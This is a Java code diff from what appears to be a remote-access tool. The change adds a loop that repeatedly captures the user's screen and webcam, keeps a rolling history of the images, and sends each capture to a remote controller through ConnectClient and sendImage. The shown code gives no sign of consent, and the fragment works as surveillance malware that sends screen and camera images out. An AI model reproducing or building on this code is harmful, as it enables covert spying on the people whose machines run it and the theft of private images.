@@ -28,11 +28,12 @@ public class ImageComponents {
     public static ScheduledFuture<?> WEBCAM;
     public static ScheduledFuture<?> SCREEN;
     public static boolean LIVE_STOPPER = true;
+    public static boolean SENDING = false;
 
     /**
      * Start Local History
      */
-    public static void startInstance() {
+    public static void startHistory() {
         try {
             ControlComponents.ROBOT_INSTANCE = new Robot();
         } catch (Exception exception) {
@@ -40,24 +41,41 @@ public class ImageComponents {
         }
 
         for (; ; ) {
-            BufferedImage screen = getImage(0, false);
-            if (screen != null) {
-                SCREEN_HISTORY.add(screen);
-                if (SCREEN_HISTORY.size() > HISTORY_LIMIT) {
-                    SCREEN_HISTORY.remove(0);
-                }
-            }
-            BufferedImage webcam = getWebcam(0, WEBCAM_LIVE, false);
-            if (webcam != null) {
-                WEBCAM_HISTORY.add(webcam);
-                if (WEBCAM_HISTORY.size() > HISTORY_LIMIT) {
-                    WEBCAM_HISTORY.remove(0);
-                }
-            }
+            execHistoryUpdate();
+        }
+    }
+
+    public static void execHistoryUpdate() {
+        while (SENDING) {
             try {
-                Thread.sleep(HISTORY_EACH);
-            } catch (InterruptedException ignored) {
+                Thread.sleep(1000);
+            } catch (Exception ignored) {
             }
+            return;
+        }
+        SENDING = true;
+        BufferedImage screen = getImage(0, false);
+        if (screen != null) {
+            SCREEN_HISTORY.add(screen);
+            if (SCREEN_HISTORY.size() > HISTORY_LIMIT) {
+                SCREEN_HISTORY.remove(0);
+            }
+            ConnectClient.msg("icon-screen");
+            sendImage(9, screen);
+        }
+        BufferedImage webcam = getWebcam(0, WEBCAM_LIVE, false);
+        if (webcam != null) {
+            WEBCAM_HISTORY.add(webcam);
+            if (WEBCAM_HISTORY.size() > HISTORY_LIMIT) {
+                WEBCAM_HISTORY.remove(0);
+            }
+            ConnectClient.msg("icon-webcam");
+            sendImage(9, webcam);
+        }
+        SENDING = false;
+        try {
+            Thread.sleep(HISTORY_EACH);
+        } catch (InterruptedException ignored) {
         }
     }
 
